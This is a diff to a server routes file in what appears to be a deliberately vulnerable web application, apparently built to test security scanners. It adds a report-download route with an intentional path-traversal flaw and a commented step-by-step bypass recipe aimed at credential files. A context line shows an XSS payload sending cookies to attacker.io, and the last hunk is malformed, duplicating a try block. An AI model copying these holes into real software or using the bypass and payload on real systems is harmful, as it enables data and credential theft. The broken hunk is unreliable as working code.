@@ -2,8 +2,8 @@ import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { db } from "./db";
-import { walletTransactions } from "@shared/schema";
-import { eq } from "drizzle-orm";
+import { walletTransactions, scanJobs } from "@shared/schema";
+import { eq, and } from "drizzle-orm";
 import { api } from "@shared/routes";
 import { exec } from "child_process";
 import fs from "fs";
@@ -568,6 +568,197 @@ export async function registerRoutes(
       const target = path.join(process.cwd(), filename); // VULN: traversal not resolved before check
       res.json({ content: fs.readFileSync(target, "utf8"), resolvedPath: target });
     } catch (e: any) { res.status(500).json({ message: "Error: " + e.message }); }
+  });
+
+  // ── SCAN REPORT DOWNLOAD ─────────────────────────────────────────────────────
+  //
+  // GET /api/reports/download?reportId=<id>
+  //
+  // Allows authenticated users to download the flat-file report for a scan job
+  // they own.  The ownership check is implemented as a middleware function that
+  // queries the database, providing a seemingly robust access control layer.
+  //
+  // ── What the scanner flags ───────────────────────────────────────────────────
+  // The scanner traces req.query.reportId (user-controlled) to:
+  //
+  //   const filepath = path.join(REPORTS_DIR, reportId);  // ← taint sink
+  //   fs.readFileSync(filepath, "utf8");
+  //
+  // It sees the REPORTS_DIR constant is a fixed path, and it can read the source
+  // of requireReportAccess(). The middleware does query the database — the scanner
+  // knows that. But it CANNOT evaluate the runtime semantics of the query:
+  //
+  //   db.select().from(scanJobs)
+  //     .where(and(eq(scanJobs.id, numericId), eq(scanJobs.userId, callerUserId)))
+  //
+  // It cannot determine whether this membership check constitutes a sufficient
+  // allowlist for the filename, because proving that requires understanding:
+  //   1. That parseInt() truncates the string at the first non-numeric character
+  //   2. That the truncated integer satisfies the DB WHERE clause
+  //   3. But the RAW string (before truncation) is what flows into path.join
+  //
+  // The scanner does not model parseInt() as a value-narrowing sanitizer for
+  // path components — it only reduces a type (string → number), it does not
+  // confine the original string to safe characters.  Taint survives. Finding: HIGH.
+  //
+  // ── Why the scanner is right ─────────────────────────────────────────────────
+  // JavaScript's parseInt() stops at the first non-numeric character:
+  //
+  //   parseInt("1/../../server/github.ts", 10)  →  1
+  //
+  // The DB check uses parseInt(reportId) → numericId = 1 → query:
+  //   WHERE id = 1 AND user_id = <caller>
+  // Scan job 1 belongs to jdoe. jdoe's session passes the check.
+  //
+  // But the filename uses the RAW req.query.reportId string — not req.validatedJob.id:
+  //
+  //   path.join("/home/runner/workspace/reports", "1/../../server/github.ts")
+  //   = /home/runner/workspace/server/github.ts
+  //
+  // That file contains the hardcoded GITHUB_TOKEN.
+  //
+  // ── Full bypass recipe ───────────────────────────────────────────────────────
+  //   1. Authenticate as jdoe (owns scan job 1)
+  //   2. GET /api/reports/download?reportId=1/../../server/github.ts
+  //   3. Server reads /home/runner/workspace/server/github.ts → returns full source
+  //      including: const GITHUB_TOKEN = "github_pat_11B3U6AMY0ao..."
+  //
+  // Other reachable targets (all resolve from reports/ with 2 up-steps):
+  //   1/../../server/credentials.ts   — ROTATION_SEED + all credential generation
+  //   1/../../server/routes.ts        — full application source
+  //   1/../../.env                    — environment variables (if present)
+  //   1/../../package.json            — dependency inventory for CVE targeting
+  //   1/../../logs/app.log            — access logs (use ../logs/app.log for 1 hop)
+
+  // REPORTS_DIR: absolute path to the scan report store.
+  // Constant — the scanner can see this is a fixed value.
+  // VULN: path.join() does not prevent traversal when reportId contains "../".
+  const REPORTS_DIR = path.resolve("./reports");
+
+  // requireReportAccess — ownership middleware
+  //
+  // LOOKS SAFE: queries the database to verify the caller owns the report.
+  // IS UNSAFE:  uses parseInt(reportId) for the SQL predicate, but does NOT
+  //             constrain the raw reportId string that flows into path.join().
+  //
+  // VULN: The scanner sees this middleware is applied, can read its source, but
+  //       cannot prove the DB check constitutes a sufficient allowlist for the
+  //       filename — because proving that requires runtime knowledge of how
+  //       parseInt() truncates the value before the query but not before the read.
+  const requireReportAccess = async (req: any, res: any, next: any) => {
+    const reportId = req.query.reportId as string | undefined;
+
+    if (!reportId) {
+      return res.status(400).json({
+        message: "reportId query parameter is required.",
+        example: "/api/reports/download?reportId=1",
+      });
+    }
+
+    // VULN: parseInt() narrows the TYPE (string → number) but does NOT narrow
+    //       the VALUE of the original string.  The raw reportId is still
+    //       "1/../../server/github.ts" — only the integer 1 is used for DB lookup.
+    //       The route handler below uses req.query.reportId (raw) for the filepath.
+    const numericId = parseInt(reportId, 10);
+
+    if (isNaN(numericId)) {
+      return res.status(400).json({ message: "reportId must be a valid integer." });
+    }
+
+    // VULN: callerUserId read from req.sentinelUser (set by requireAuth middleware).
+    //       Any JWT with a valid or forged userId passes here.
+    const callerUserId: number = req.sentinelUser?.userId;
+
+    try {
+      // DB ownership check — queries scan_jobs by integer ID AND caller's user ID.
+      // Appears to fully validate access.  In practice it only validates that
+      // parseInt(reportId) matches a row owned by this user — the path component
+      // after the integer is never examined.
+      const rows = await db
+        .select()
+        .from(scanJobs)
+        .where(and(
+          eq(scanJobs.id, numericId),
+          eq(scanJobs.userId, callerUserId),
+        ))
+        .limit(1);
+
+      if (rows.length === 0) {
+        return res.status(403).json({
+          message: "Report not found or access denied.",
+          detail:  "Scan job does not exist or belongs to a different user.",
+        });
+      }
+
+      // Attach the DB-validated job object to req for downstream use.
+      // VULN: the route handler ignores req.validatedJob.id (the safe integer)
+      //       and re-reads req.query.reportId (the raw, tainted string) instead.
+      req.validatedJob = rows[0];
+      next();
+    } catch (e: any) {
+      res.status(500).json({ message: "Access check failed: " + e.message });
+    }
+  };
+
+  // GET /api/reports/download — download a scan report flat file
+  //
+  // VULN: taint path —
+  //   source: req.query.reportId (user-controlled URL parameter)
+  //   sink:   path.join(REPORTS_DIR, reportId)  →  fs.readFileSync(filepath)
+  //
+  // The middleware above ran and validated parseInt(reportId) against the DB.
+  // This route then re-reads req.query.reportId (the raw string) for the filepath.
+  // parseInt() truncation means validation passed, but traversal is preserved.
+  //
+  // Scanner finding: HIGH — user-controlled input reaches path.join / readFileSync.
+  //   Sanitization via DB membership check cannot be verified at static-analysis
+  //   time; parseInt() does not constrain the original string to safe characters.
+  app.get("/api/reports/download", requireAuth, requireReportAccess, (req: any, res) => {
+    // VULN: uses req.query.reportId — the raw, user-controlled string.
+    //       NOT req.validatedJob.id — which would be the safe, DB-validated integer.
+    //       The middleware attached req.validatedJob but this handler ignores it
+    //       for the filepath construction.
+    const reportId = req.query.reportId as string;
+
+    // VULN: path.join does not strip traversal sequences.
+    //       "1/../../server/github.ts" resolves to ../server/github.ts from REPORTS_DIR.
+    const filepath = path.join(REPORTS_DIR, reportId);
+
+    // Log the resolved path — useful for observing the bypass in server logs.
+    // VULN: logs the fully-resolved path, which reveals the traversal to any
+    //       log consumer even when the file read succeeds silently.
+    console.log(JSON.stringify({
+      timestamp:    new Date().toISOString(),
+      level:        "INFO",
+      category:     "REPORT_DOWNLOAD",
+      callerUserId: req.sentinelUser?.userId,
+      jobId:        req.validatedJob?.id,
+      // VULN: raw reportId logged — traversal attempt visible in log stream
+      rawReportId:  reportId,
+      resolvedPath: filepath,
+      withinReportsDir: filepath.startsWith(REPORTS_DIR),
+    }));
+
+    try {
+      // VULN: no check that filepath is inside REPORTS_DIR before reading.
+      //       filepath.startsWith(REPORTS_DIR) is logged above but never enforced.
+      const content = fs.readFileSync(filepath, "utf8");
+
+      res.setHeader("Content-Type", "text/plain; charset=utf-8");
+      res.setHeader(
+        "Content-Disposition",
+        `attachment; filename="sentinel-report-${req.validatedJob?.id ?? "unknown"}.txt"`,
+      );
+      res.send(content);
+    } catch (e: any) {
+      // VULN: error message reveals the attempted filepath — information disclosure
+      //       even when the traversal target does not exist.
+      res.status(404).json({
+        message: "Report file not found.",
+        detail:  e.message,   // <-- full OS path disclosed in error
+        hint:    `Looked in: ${filepath}`,
+      });
+    }
   });
 
   // 5. eval() Deserialization — RCE via direct eval()
@@ -1271,6 +1462,12 @@ export async function registerRoutes(
   // VULN: body accepted and stored raw — no sanitization performed server-side.
   // Exploit: POST { title: "...", slug: "...", body: '<svg onload="fetch(\"https://attacker.io/c=\"+document.cookie)">' }
   app.post("/api/kb/articles", requireAuth, async (req: any, res) => {
+    try {
+      if (req.sentinelUser?.role !== "admin") {
+        return res.status(403).json({ message: "Forbidden: admin role required" });
+      }
+      const { title, slug, body, category, tags } = req.body;
+      if (!title || !slug || !body) {
     try {
       const { title, slug, body, category, tags } = req.body;
       if (!title || !slug || !body) {
